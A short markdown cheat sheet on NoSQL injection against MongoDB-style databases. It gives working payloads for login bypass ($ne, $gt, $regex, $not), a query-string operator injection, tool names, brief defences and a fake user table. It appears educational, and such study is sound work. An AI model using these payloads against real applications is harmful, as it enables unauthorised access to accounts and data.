# 🧨 NoSQL Injection

## 📌 Overview

NoSQL injection targets databases like **MongoDB, CouchDB, Firebase**, etc. It manipulates queries using JSON-style syntax instead of traditional SQL.

---

## 💥 Common Attack Patterns

### 1. Authentication Bypass

```json
{
  "username": { "$ne": null },
  "password": { "$ne": null }
}
```
This bypasses login forms if the backend uses:
```javascript
db.users.find({ username: req.body.username, password: req.body.password });
```
2. Regex Password Bypass
```json
{
  "username": "admin",
  "password": { "$regex": ".*" }
}
```
If the app uses regex-matching on password fields, this will accept any password.

3. Boolean Exploits
```javascript
{
  "username": { "$gt": "" },
  "password": { "$gt": "" }
}
```
This passes because non-null strings are greater than empty.

4. URL-based GET Exploit
```bash
GET /user?id[$ne]=0
```
Exploiting a vulnerable endpoint that accepts IDs as parameters.
Injecting operators in query params if the server converts them to MongoDB filters.

### 🔧 Real Tools
NoSQLMap
Burp Suite Intruder
Postman / curl
MongoDB Compass (for exploring documents)

### 🛡️ Defenses
Type check and sanitize inputs (e.g., disallow objects in login inputs)
Use schema validation (Mongoose, JOI)
Do not directly use user inputs in queries

### 🧠 Extra
Test with:
```javascript
{ "username": "admin", "password": { "$not": { "$eq": "wrong" } } }
```
This tricks many naive filters.


---

### ✅ Optional: `users.json` (Fake DB Data)

```json
[
  { "username": "admin", "password": "secret", "role": "admin" },
  { "username": "teshiii", "password": "gold", "role": "user" }
]
```